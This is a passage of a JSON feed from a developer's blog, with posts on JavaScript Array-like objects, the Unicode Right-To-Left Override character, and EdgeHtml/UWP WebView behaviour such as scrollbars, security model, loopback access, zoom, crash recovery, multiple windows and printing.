operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string-property property\">'0'</span><span class=\"token operator\">:</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">'1'</span><span class=\"token operator\">:</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">'length'</span><span class=\"token operator\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br><span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// {0: 'a', 1: 'b', length: 2}</span><br><span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ['b']</span></code></pre>\n<p>Now that I have an object with a configurable <code>length</code> property I can delete the <code>length</code>. After that the Array functions don't like my object anymore. But they don't complain. They still produce something:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">delete</span> o<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span><br><span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// []</span><br><span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">,</span> <span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ''</span></code></pre>\n",
			"date_published": "2021-11-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2020-10/Right-To-Left+Override+Twitter+Name/",
			"url": "https://deletethis.net/dave/2020-10/Right-To-Left+Override+Twitter+Name/",
			"title": "Right-To-Left Override Twitter Name",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Its rare to find devs anticipating <a href=\"https://en.wikipedia.org/wiki/Unicode_control_characters\">Unicode control characters</a> showing up in user input. And the most fun when unanticipated\n    is the <a href=\"https://www.unicode.org/reports/tr9/\">Right-To-Left Override character U+202E</a>. Unicode characters have an implicit direction so that for example by default Hebrew characters\n    are rendered from right to left, and English characters are rendered left to right. The override characters force an explicit direction for all the text that follows.\n  </p><p>\n    I chose my Twitter display name to include the HTML encoding of the Right-To-Left Override character <code>#x202E;</code> as a sort of joke or shout out to my favorite Unicode control character.\n    I did not anticipate that some Twitter clients in some of their UI would fail to encode it correctly. There's no way I can remove that from my display name now.\n  </p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://twitter.com/SeanOnTwt/status/1238621896033185792\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"\" data-original-height=\"686\" data-original-width=\"943\" height=\"233\" src=\"https://lh3.googleusercontent.com/-Au3kmWbDskY/X5EVrJiAcgI/AAAAAAAAGHA/Y4ovPZvSfqcLqlP2O8cbzcVfspU3_76-ACNcBGAsYHQ/image.png\" width=\"320\"></a></div><br><p>\n    Try it on Amazon.\n  </p><div><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://twitter.com/jdalton/status/946494105147777024\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"\" data-original-height=\"390\" data-original-width=\"1175\" height=\"106\" src=\"https://lh3.googleusercontent.com/-rg5Pc6WRAX4/X5EWfAlovpI/AAAAAAAAGHI/hm2GK7SAGLMEXEdQ7k_Lipd9A7psDrklQCNcBGAsYHQ/image.png\" width=\"320\"></a></div><br>\n    How about pages that want to tell you about the U+202E. \n  </div><div><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://lh3.googleusercontent.com/-DkpiukXPx2w/X5EdVyicxII/AAAAAAAAGHU/1ikdX1z6aSIbtT-98prUIGmCXZmWPH84wCNcBGAsYHQ/image.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"\" data-original-height=\"449\" data-original-width=\"1284\" height=\"112\" src=\"https://lh3.googleusercontent.com/-DkpiukXPx2w/X5EdVyicxII/AAAAAAAAGHU/1ikdX1z6aSIbtT-98prUIGmCXZmWPH84wCNcBGAsYHQ/image.png\" width=\"320\"></a></div><br><br></div></div></div>\n",
			"date_published": "2020-10-21T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2019-08/Scrollbars+in+EdgeHtml+WebView+and+Edge+browser/",
			"url": "https://deletethis.net/dave/2019-08/Scrollbars+in+EdgeHtml+WebView+and+Edge+browser/",
			"title": "Scrollbars in EdgeHtml WebView and Edge browser",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The scrollbars in UWP WebView and in Edge have different default behavior leading to many emails to my team. (Everything I talk about here is for the EdgeHtml based WebView and Edge browser and\n    does not apply to the Chromium based Edge browser and WebView2).\n  </p><p>\n    There is a Edge only <code><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/-ms-overflow-style\">-ms-overflow-style</a></code> CSS property that controls scroll behavior. We have a\n    different default for this in the WebView as compared to the Edge browser. If you want the appearance of the scrollbar in the WebView to match the browser then you must explicitly set that CSS\n    property. The Edge browser default is <code>scrollbar</code> which gives us a Windows desktop styled non-auto-hiding scrollbar. The WebView default is <code>-ms-autohiding-scrollbar</code> which\n    gives a sort of compromise between desktop and UWP app scrollbar behavior. In this configuration it is auto-hiding. When used with the mouse you'll get Windows desktop styled scrollbars and when\n    used with touch you'll get the UWP styled scrollbars.\n  </p><p>\n    Since WebViews are intended to be used in apps this style is the default in order to better match the app's scrollbars. However this difference between the browser and WebView has led to\n    confusion.\n  </p><p>\n    Here’s an <a href=\"https://jsfiddle.net/5vfrhtyb/\">-ms-overflow-style JSFiddle</a> showing the difference between the two styles. Try it in the Edge browser and in WebView. An easy way to try it\n    in the Edge WebView is using the <a href=\"https://www.microsoft.com/en-us/p/javascript-browser/9nblggh1z7vx?rtc=1&amp;activetab=pivot%3Aoverviewtab\">JavaScript Browser</a>.\n  </p></div></div>\n",
			"date_published": "2019-08-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-11/Edge+browser+and+JavaScript+UWP+app+security+model+comparison/",
			"url": "https://deletethis.net/dave/2018-11/Edge+browser+and+JavaScript+UWP+app+security+model+comparison/",
			"title": "Edge browser and JavaScript UWP app security model comparison",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    There are two main differences in terms of security between a JavaScript UWP app and the Edge browser:\n  </p><h2>\n    Process Model\n  </h2><p>\n    A JavaScript UWP app has one process (technically not true with background tasks and other edge cases but ignoring that for the moment) that runs in the corresponding appcontainer defined by the\n    app's appx manifest. This one process is where edgehtml is loaded and is rendering HTML, talking to the network, and executing script. Specifically, the UWP main UI thread is the one where your\n    script is running and calling into WinRT.\n  </p><p>\n    In the Edge browser there is a browser process running in the same appcontainer defined by its appx manifest, but there are also tab processes. These tab processes are running in restricted app\n    containers that have fewer appx capabilities. The browser process has XAML loaded and coordinates between tabs and handles some (non-WinRT) brokering from the tab processes. The tab processes\n    load edgehtml and that is where they render HTML, talk to the network and execute script.\n  </p><p>\n    There is no way to configure the JavaScript UWP app's process model but using WebViews you can approximate it. You can create out of process WebViews and to some extent configure their\n    capabilities, although not to the same extent as the browser. The WebView processes in this case are similar to the browser's tab processes. See the <a href=\"https://docs.microsoft.com/en-us/microsoft-edge/hosting/webview/mswebviewprocess#createwebviewasync\">MSWebViewProcess object</a> for configuring out of process WebView creation. I also\n    implemented <a href=\"https://deletethis.net/dave/2018-05/Tiny+browser+features%3A+JSBrowser+crash+resistance\">out of proc WebView tabs</a> in my JSBrowser fork.\n  </p><h2>\n    ApplicationContentUriRules\n  </h2><p>\n    The ApplicationContentUriRules (ACUR) section of the appx manifest lets an application define what URIs are considered app code. See a previous post for <a href=\"https://deletethis.net/dave/2017-06/Application+Content+URI+Rule+effects\">the list of ACUR effects</a>.\n  </p><p>\n    Notably app code is able to access WinRT APIs. Because of this, DOM security restrictions are loosended to match what is possible with WinRT.\n  </p><p>\n    Privileged DOM APIs like geolocation, camera, mic etc require a user prompt in the browser before use. App code does not show the same browser prompt. There still may be an OS prompt – the same\n    prompt that applies to any UWP app, but that’s usually per app not per origin.\n  </p><p>\n    App code also gets to use XMLHttpRequest or fetch to access cross origin content. Because UWP apps have separate state, cross origin here might not mean much to an attacker unless your app also\n    has the user login to Facebook or some other interesting cross origin target.\n  </p></div></div>\n",
			"date_published": "2018-11-29T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-10/GoBack-GoForward+in+Win10+UWP+WebView/",
			"url": "https://deletethis.net/dave/2018-10/GoBack-GoForward+in+Win10+UWP+WebView/",
			"title": "GoBack/GoForward in Win10 UWP WebView",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The GoBack and GoForward methods on the UWP WebView (x-ms-webview in HTML, Windows.UI.Xaml.Controls.WebView in XAML, and Windows.Web.UI.Interop.WebViewControl in Win32) act the same as the Back\n    and Forward buttons in the Edge browser. They don't necessarily change the top level document of the WebView. If inside the webview an iframe navigates then that navigation will be recorded in\n    the forward/back history and the GoBack / GoForward call may result in navigating that iframe. This makes sense as an end user using the Edge browser since if I click a link to navigate one place\n    and then hit Back I expect to sort of undo that most recent navigation regardless of if that navigation happened in an iframe or the top level document.\n  </p><p>\n    If that doesn't make sense for your application and you want to navigate forward or back ignoring iframe navigates, unfortunately there's no perfect workaround.\n  </p><p>\n    One workaround could be to try calling GoBack and then checking if a FrameNavigationStarting event fires or a NavigationStarting event fires. If a frame navigates then try calling GoBack again.\n    There could be async races in this case since other navigates could come in and send you the wrong signal and interrupt your multi step GoBack operation.\n  </p><p>\n    You could also try keeping track of all top level document navigations and manually navigate back to the URIs you care about. However, GoBack and GoForward also restore some amount of user state\n    (form fills etc) in addition to navigating. Manually calling navigate will not give this same behavior.\n  </p></div></div>\n",
			"date_published": "2018-10-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-10/Changing+the+User+Agent+string+in+UWP+WebView/",
			"url": "https://deletethis.net/dave/2018-10/Changing+the+User+Agent+string+in+UWP+WebView/",
			"title": "Changing the User Agent string in UWP WebView",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    There's no perfect way to change the user agent string for the UWP WebView (x-ms-webview in HTML, Windows.UI.Xaml.Controls.WebView in XAML, and Windows.Web.UI.Interop.WebViewControl in Win32) but\n    there are two imperfect methods folks end up using.\n  </p><p>\n    The first is to call UrlMkSetSessionOption. This is an old public API that allows you to configure various arcane options including one that is the default user agent string for requests running\n    through urlmon. This API is allowed by the Microsoft Store for UWP apps. The change it applies is process wide which has two potential drawbacks. If you want to be able to have different UA\n    strings set for different requests from a WebView that's not really possible with this solution. The other drawback is if you're using out of process WebView, you need to ensure you're calling\n    into UrlMkSetSessionOption in the WebView's process. You'll need to write third party WinRT that calls UrlMkSetSessionOption, create the out of proc WebView, navigate it to some trusted local\n    page, use AddWebAllowedObject or provide that URI WinRT access, and call into your third party WinRT. You'll need to do that for any new WebView process you create.\n  </p><p>\n    The second less generally applicable solution is to use NavigateWithHttpRequestMessage and set the User-Agent HTTP header. In this case you get to control the scope of the user agent string\n    changes but has the limitations that not all sub resource downloads will use this user agent string and for navigations you don't initiate you have to manually intercept and re-request being\n    careful to transfer over all POST body state and HTTP headers correctly. That last part is not actually possible for iframes.\n  </p></div></div>\n",
			"date_published": "2018-10-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-07/Windows.Web.UI.Interop.WebViewControl+localhost+access/",
			"url": "https://deletethis.net/dave/2018-07/Windows.Web.UI.Interop.WebViewControl+localhost+access/",
			"title": "Windows.Web.UI.Interop.WebViewControl localhost access",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    If you're developing with the new <a href=\"https://docs.microsoft.com/en-us/uwp/api/windows.web.ui.interop.webviewcontrol\">Windows.Web.UI.Interop.WebViewControl</a> you may have noticed you\n    cannot navigate to localhost HTTP servers. This is because the WebViewControl's WebView process is a UWP process. All UWP processes by default cannot use the loopback adapter as a security\n    precaution. For development purposes you can allow localhost access using the <a href=\"https://msdn.microsoft.com/en-us/library/windows/apps/hh780593.aspx\">checknetisolation command line tool</a>\n    on the WebViewControl's package just as you can for any other UWP app. The command should be the following:\n  </p><pre><code>checknetisolation loopbackexempt -a -n=Microsoft.Win32WebViewHost_cw5n1h2txyewy</code></pre><p>\n    As a warning checknetisolation is not good on errors. If you attempt to add a package but get its package family name wrong, checknetisolation just says OK:\n  </p><pre><code>C:\\Users\\davris&gt;checknetisolation LoopbackExempt -a -n=Microsoft.BingWeather_4.21.2492.0_x86__8wekyb3d8bbwe<br>OK.</code></pre>And if you then list the result of the add with the\n  bad name you'll see the following:\n  <pre><code>[1] -----------------------------------------------------------------<br>    Name: AppContainer NOT FOUND<br>    SID:  S-1-15-...</code></pre><p>\n    There's also a <a href=\"https://github.com/tiagonmas/Windows-Loopback-Exemption-Manager\">UI tool for modifying loopback exemption</a> for packages available on GitHub and also one available with\n    Fiddler.\n  </p><p>\n    As an additional note, I mentioned above you can try this for development. Do not do this in shipping products as this turns off the security protection for any consumer of the WebViewControl.\n  </p></div></div>\n",
			"date_published": "2018-07-25T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-05/Win10+PWA+Terminology/",
			"url": "https://deletethis.net/dave/2018-05/Win10+PWA+Terminology/",
			"title": "Win10 PWA Terminology",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Folks familiar with JavaScript UWP apps in Win10 have often been confused by what PWAs in Win10 actually are. TLDR: PWAs in Win10 are simply JavaScript UWP apps. The main difference between these\n    JS UWP Apps and our non-PWA JS UWP apps are our target end developer audience, and how we get Win10 PWAs into the Microsoft Store. See this <a href=\"https://blogs.windows.com/msedgedev/2018/02/06/welcoming-progressive-web-apps-edge-windows-10/\">Win10 blog post on PWAs on Win10</a> for related info.\n  </p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://2.bp.blogspot.com/-n9rUPrvz1R0/WxBrwedBw2I/AAAAAAAABy8/t8fVGO92wCMl3Fl8JBT5qmNjWd9TyWgqACLcBGAs/s1600/pwa-diagram.png\" imageanchor=\"1\" style=\"clear: left; float: left; margin-bottom: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"271\" data-original-width=\"705\" src=\"https://2.bp.blogspot.com/-n9rUPrvz1R0/WxBrwedBw2I/AAAAAAAABy8/t8fVGO92wCMl3Fl8JBT5qmNjWd9TyWgqACLcBGAs/s1600/pwa-diagram.png\"></a></div><h2>\n    Web App\n  </h2><p>\n    On the web a subset of web sites are web apps. These are web sites that have app like behavior - that is a user might call it an app like Outlook, Maps or Gmail. And they may also have a <a href=\"https://www.w3.org/TR/appmanifest/\">W3C app manifest</a>.\n  </p><p>\n    A subset of web apps are progressive web apps. Progressive web apps are web apps that have a W3C app manifest and a <a href=\"https://www.w3.org/TR/service-workers-1/\">service worker</a>. Various\n    OSes are beginning to support PWAs as first class apps on their platform. This is true for Win10 as well in which PWAs are run as a WWA.\n  </p><h2>\n    Windows Web App\n  </h2><p>\n    In Win10 a WWA (Windows Web App) is an unofficial term for a JavaScript UWP app. These are UWP apps so they have an AppxManifest.xml, they are packaged in an Appx package, they run in an App\n    Container, they use WinRT APIs, and are installed via the Microsoft Store. Specific to WWAs though, is that the AppxManifest.xml specifies a StartPage attribute identifying some HTML content to\n    be used as the app. When the app is activated the OS will create a WWAHost.exe process that hosts the HTML content using the EdgeHtml rendering engine.\n  </p><h2>\n    Packaged vs Hosted Web App\n  </h2><p>\n    Within that we have a notion of a packaged web app and an HWA (hosted web app). There's no real technical distinction for the end developer between these two. The only real difference is whether\n    the StartPage identifies remote HTML content on the web (HWA), or packaged HTML content from the app's appx package (packaged web app). An end developer may create an app that is a mix of these\n    as well, with HTML content in the package and HTML content from the web. These terms are more like ends on a continuum and identifying two different developer scenarios since the underlying\n    technical aspect is pretty much identical.\n  </p><h2>\n    Win10 PWA\n  </h2><p>\n    Win10 PWAs are simply HWAs that specify a StartPage of a URI for a PWA on the web. These are still JavaScript UWP apps with all the same behavior and abilities as other UWP apps. We have two ways\n    of getting PWAs into the Microsoft Store as Win10 PWAs. The first is <a href=\"https://www.pwabuilder.com/\">PWA Builder</a> which is a tool that helps PWA end developers create and submit to the\n    Microsoft Store a Win10 PWA appx package. The second is a crawler that runs over the web looking for PWAs which we convert and submit to the Store using an automated PWA Builder-like tool to\n    create a Win10 PWA from PWAs on the web (see <a href=\"https://blogs.windows.com/msedgedev/2018/02/06/welcoming-progressive-web-apps-edge-windows-10/\">Welcoming PWAs to Win10</a> for more info).\n    In both cases the conversion involves examining the PWAs W3C app manifest and producing a corresponding AppxManifest.xml. Not all features supported by AppxManifest.xml are also available in the\n    W3c app manifest. But the result of PWA Builder can be a working starting point for end developers who can then update the AppxManifest.xml as they like to support features like share targets or\n    others not available in W3C app manifests.\n  </p></div></div>\n",
			"date_published": "2018-05-31T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-05/Tiny+browser+features-+JSBrowser+crash+resistance/",
			"url": "https://deletethis.net/dave/2018-05/Tiny+browser+features-+JSBrowser+crash+resistance/",
			"title": "Tiny browser features: JSBrowser crash resistance",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://github.com/david-risney/JSBrowser\">JSBrowser</a> is a basic browser built as a Win10 JavaScript UWP app around the WebView HTML element. Its fun and relatively simple to\n    implement tiny browser features in JavaScript and in this post I'm implementing crash resistance.\n  </p><p>\n    The normal DOM mechanisms for <a href=\"https://docs.microsoft.com/en-us/microsoft-edge/webview#remarks\">creating an HTML WebView</a> create an in-process WebView, in which the WebView runs on a\n    unique UI thread. But we can use the MSWebView constructor instead to create an out-of-process WebView in which the WebView runs in its own distinct WebView process. Unlike an in-process WebView,\n    Web content running in an out-of-process WebView can only crash the WebView process and not the app process.\n  </p><pre><code>        this.replaceWebView = () =&gt; {<br>            let webview = document.querySelector(\"#WebView\");<br>            // Cannot access webview.src - anything that would need to communicate with the webview process may fail<br>            let oldSrc = browser.currentUrl;<br>            const webviewParent = webview.parentElement;<br>            webviewParent.removeChild(webview);<br>            webview = new MSWebView();<br>            Object.assign(this, {<br>                \"webview\": webview<br>            });<br>            webview.setAttribute(\"id\", \"WebView\");<br><br>            // During startup our currentUrl field is blank. If the WebView has crashed <br>            // and we were on a URI then we may obtain it from this property.<br>            if (browser.currentUrl &amp;&amp; browser.currentUrl != \"\") {<br>                this.trigger(\"newWebview\");<br>                this.navigateTo(browser.currentUrl);<br>            }<br>            webviewParent.appendChild(webview);</code></pre><p>\n    I run replaceWebView during startup to replace the in-process WebView created via HTML markup with an out-of-process WebView. I could be doing more to dynamically copy styles, attributes, etc but\n    I know what I need to set on the WebView and just do that.\n  </p><p>\n    When a WebView process crashes the corresponding WebView object is no longer useful and a new WebView element must be created. In fact if the old WebView object is used it may throw and will no\n    longer have valid state. Accordingly when the WebView crashes I run replaceWebView again. Additionally, I need to store the last URI we've navigated to (browser.currentUrl in the above) since the\n    crashed WebView object won't know what URI it is on after it crashes.\n  </p><pre><code>            webview.addEventListener(\"MSWebViewProcessExited\", () =&gt; { <br>                if (browser.currentUrl === browser.lastCrashUrl) {                   ++browser.lastCrashUrlCrashCount; <br>                } <br>                else { <br>                    browser.lastCrashUrl = browser.currentUrl; <br>                    browser.lastCrashUrlCrashCount = 1; <br>                } <br>                // If we crash again and again on the same URI, maybe stop trying to load that URI. <br>                if (browser.lastCrashUrlCrashCount &gt;= 3) { <br>                    browser.lastCrashUrl = \"\"; <br>                    browser.lastCrashUrlCrashCount = 0; <br>                    browser.currentUrl = browser.startPage; <br>                } <br>                this.replaceWebView(); <br>            }); </code></pre><p>\n    I also keep track of the last URI that we recovered and how many times we've recovered that same URI. If the same URI crashes more than 3 times in a row then I assume that it will keep happening\n    and I navigate to the start URI instead.\n  </p></div></div>\n",
			"date_published": "2018-05-13T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-05/Tiny+browser+features-+JSBrowser+zoom/",
			"url": "https://deletethis.net/dave/2018-05/Tiny+browser+features-+JSBrowser+zoom/",
			"title": "Tiny browser features: JSBrowser zoom",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://github.com/david-risney/JSBrowser\">JSBrowser</a> is a basic browser built as a Win10 JavaScript UWP app around the WebView HTML element. Its fun and relatively simple to\n    implement tiny browser features in JavaScript and in this post I'm implementing zoom.\n  </p><p>\n    My plan to implement zoom is to add a zoom slider to the settings div that controls the scale of the WebView element via CSS transform. My <a href=\"https://github.com/david-risney/JSBrowser/commit/58987dcbc44b0818602e99574a3dec9406f4fa2e\">resulting zoom change</a> is in git and you can try the whole thing out in my JSBrowser fork.\n  </p><h2>\n    Slider\n  </h2><p>\n    I can implement the zoom settings slider as a range type input HTML element. This conveniently provides me a min, max, and step property and suits exactly my purposes. I chose some values that I\n    thought would be reasonable so the browser can scale between half to 3x by increments of one quarter. This is a tiny browser feature after all so there's no custom zoom entry.\n  </p><pre><code>&lt;a&gt;&lt;label for=\"webviewZoom\"&gt;Zoom&lt;/label&gt;&lt;input type=\"range\" min=\"50\" max=\"300\" step=\"25\" value=\"100\" id=\"webviewZoom\" /&gt;&lt;/a&gt;</code></pre><p>\n    To let the user know this slider is for controlling zoom, I make a label HTML element that says Zoom. The label HTML element has a for attribute which takes the id of another HTML element. This\n    lets the browser know what the label is labelling and lets the browser do things like when the label is clicked to put focus on the slider.\n  </p><h2>\n    Scale\n  </h2><p>\n    There are no explicit scale APIs for WebView so to change the size of the content in the WebView we use CSS.\n  </p><pre><code>        this.applyWebviewZoom = state =&gt; {<br>            const minValue = this.webviewZoom.getAttribute(\"min\");<br>            const maxValue = this.webviewZoom.getAttribute(\"max\");<br>            const scaleValue = Math.max(Math.min(parseInt(this.webviewZoom.value, 10), maxValue), minValue) / 100;<br><br>            // Use setAttribute so they all change together to avoid weird visual glitches<br>            this.webview.setAttribute(\"style\", [<br>                [\"width\", (100 / scaleValue) + \"%\"],<br>                [\"height\", \"calc(\" + (-40 / scaleValue) + \"px + \" + (100 / scaleValue) + \"%)\"],<br>                [\"transform\", \"scale(\" + scaleValue + \")\"]<br>            ].map(pair =&gt; pair[0] + \": \" + pair[1]).join(\"; \"));<br>        };</code></pre><p>\n    Because the user changes the scale at runtime I accordingly replace the static CSS for the WebView element with the script above to programmatically modify the style of the WebView. I change the\n    style with one setAttribute call to do my best to avoid the browser performing unnecessary work or displaying the WebView in an intermediate and incomplete state. Applying the scale to the\n    element is as simple as adding 'transform: scale(X)' but then there are two interesting problems.\n  </p><p>\n    The first is that the size of the WebView is also scaled not just the content within it. To keep the WebView the same effective size so that it still fits properly into our browser UI, we must\n    compensate for the scale in the WebView width and height. Accordingly, you can see that we scale up by scaleValue and then in width and height we divide by the scaleValue.\n  </p><pre><code>transform-origin: 0% 0%;</code></pre><p>\n    The other issue is that by default the scale transform's origin is the center of the WebView element. This means when scaled up all sides of the WebView would expand out. But when modifying the\n    width and height those apply relative to the upper left of the element so our inverse scale application to the width and height above aren't quite enough. We also have to change the origin of the\n    scale transform to match the origin of the changes to the width and height.\n  </p></div></div>\n",
			"date_published": "2018-05-10T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2018-03/Multiple+Windows+in+Win10+JavaScript+UWP+apps/",
			"url": "https://deletethis.net/dave/2018-03/Multiple+Windows+in+Win10+JavaScript+UWP+apps/",
			"title": "Multiple Windows in Win10 JavaScript UWP apps",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><h2>\n    Win10 Changes\n  </h2><p>\n    In Win8.1 JavaScript UWP apps we supported multiple windows using MSApp DOM APIs. In Win10 we use window.open and window and a new MSApp API getViewId and the previous MSApp APIs are gone:\n  </p><table><tbody><tr><td></td><th>\n          Win10\n        </th><th>\n          Win8.1\n        </th></tr><tr><th>\n          Create new window\n        </th><td><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/open\">window.open</a></td><td><a href=\"https://msdn.microsoft.com/en-us/library/dn254975(v=vs.85).aspx\">MSApp.createNewView</a></td></tr><tr><th>\n          New window object\n        </th><td><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window\">window</a></td><td><a href=\"https://msdn.microsoft.com/en-us/library/dn268315(v=vs.85).aspx\">MSAppView</a></td></tr><tr><th>\n          viewId\n        </th><td>\n          MSApp.getViewId(window)\n        </td><td><a href=\"https://msdn.microsoft.com/en-us/library/dn567969(v=vs.85).aspx\">MSAppView.viewId</a></td></tr></tbody></table><h2>\n    WinRT viewId\n  </h2><p>\n    We use window.open and window for creating new windows, but then to interact with WinRT APIs we add the MSApp.getViewId API. It takes a window object as a parameter and returns a viewId number\n    that can be used with the various <a href=\"https://docs.microsoft.com/en-us/uwp/api/Windows.UI.ViewManagement.ApplicationViewSwitcher\">Windows.UI.ViewManagement.ApplicationViewSwitcher</a> APIs.\n  </p><h2>\n    Delaying Visibility\n  </h2><p>\n    Views in WinRT normally start hidden and the end developer uses something like <a href=\"https://docs.microsoft.com/en-us/uwp/api/windows.ui.viewmanagement.applicationviewswitcher#Windows_UI_ViewManagement_ApplicationViewSwitcher_TryShowAsStandaloneAsync_System_Int32_\">TryShowAsStandaloneAsync</a>\n    to display the view once it is fully prepared. In the web world, window.open shows a window immediately and the end user can watch as content is loaded and rendered. To have your new windows act\n    like views in WinRT and not display immediately we have added a window.open option. For example<br><code>let newWindow = window.open(\"https://example.com\", null, \"msHideView=yes\");</code></p><h2>\n    Primary Window Differences\n  </h2><p>\n    The primary window that is initially opened by the OS acts differently than the secondary windows that it opens:\n  </p><table><tbody><tr><td></td><th>\n          Primary\n        </th><th>\n          Secondary\n        </th></tr><tr><th>\n          window.open\n        </th><td>\n          Allowed\n        </td><td>\n          Disallowed\n        </td></tr><tr><th>\n          window.close\n        </th><td>\n          Close app\n        </td><td>\n          Close window\n        </td></tr><tr><th>\n          Navigation restrictions\n        </th><td>\n          ACUR only\n        </td><td>\n          No restrictions\n        </td></tr></tbody></table><p>\n    The restriction on secondary windows such that they cannot open secondary windows could change in the future depending on feedback.\n  </p><h2>\n    Same Origin Communication Restrictions\n  </h2><p>\n    Lastly, there is a very difficult technical issue preventing us from properly supporting synchronous, same-origin, cross-window, script calls. That is, when you open a window that's same origin,\n    script in one window is allowed to directly call functions in the other window and some of these calls will fail. postMessage calls work just fine and is the recommended way to do things if\n    that's possible for you. Otherwise we continue to work on improving this.\n  </p></div></div>\n",
			"date_published": "2018-03-10T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-10/MSApp.getHtmlPrintDocumentSourceAsync+-+JavaScript+UWP+app+printing/",
			"url": "https://deletethis.net/dave/2017-10/MSApp.getHtmlPrintDocumentSourceAsync+-+JavaScript+UWP+app+printing/",
			"title": "MSApp.getHtmlPrintDocumentSourceAsync - JavaScript UWP app printing",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The documentation for printing in JavaScript UWP apps is out of date as it all references <a href=\"https://msdn.microsoft.com/en-us/library/hh772325(v=vs.85).aspx\">MSApp.getHtmlPrintDocumentSource</a> but that method has been replaced by MSApp.getHtmlPrintDocumentSourceAsync since WinPhone\n    8.1.\n  </p><h2>\n    Background\n  </h2><p>\n    Previous to WinPhone 8.1 the WebView's HTML content ran on the UI thread of the app. This is troublesome for rendering arbitrary web content since in the extreme case the JavaScript of some\n    arbitrary web page might just sit in a loop and never return control to your app's UI. With WinPhone 8.1 we added off thread WebView in which the WebView runs HTML content on a separate UI\n    thread.\n  </p><p>\n    Off thread WebView required changing our MSApp.getHtmlPrintDocumentSource API which could no longer synchronously produce an HtmlPrintDocumentSource. With WebViews running on their own threads it\n    may take some time for them to generate their print content for the HtmlPrintDocumentSource and we don't want to hang the app's UI thread in the interim. So the MSApp.getHtmlPrintDocumentSource\n    API was replaced with MSApp.getHtmlPrintDocumentSourceAsync which returns a promise the resolved value of which is the eventual HtmlPrintDocumentSource.\n  </p><h2>\n    Sample\n  </h2><p>\n    However, the usage of the API is otherwise unchanged. So in sample code you see referencing MSApp.getHtmlPrintDocumentSource the sample code is still reasonable but you need to call\n    MSApp.getHtmlPrintDocumentSourceAsync instead and wait for the promise to complete. For example the <a href=\"https://docs.microsoft.com/en-us/uwp/api/Windows.Graphics.Printing.PrintManager\">PrintManager docs</a> has an example implementing a PrintTaskRequested event handler in a JavaScript UWP app.\n  </p><pre><code>    function onPrintTaskRequested(printEvent) {    <br>        var printTask = printEvent.request.createPrintTask(\"Print Sample\", function (args) {<br>            args.setSource(MSApp.getHtmlPrintDocumentSource(document));<br>    });</code></pre><p>\n    Instead we need to obtain a deferral in the event handler so we can asynchronously wait for 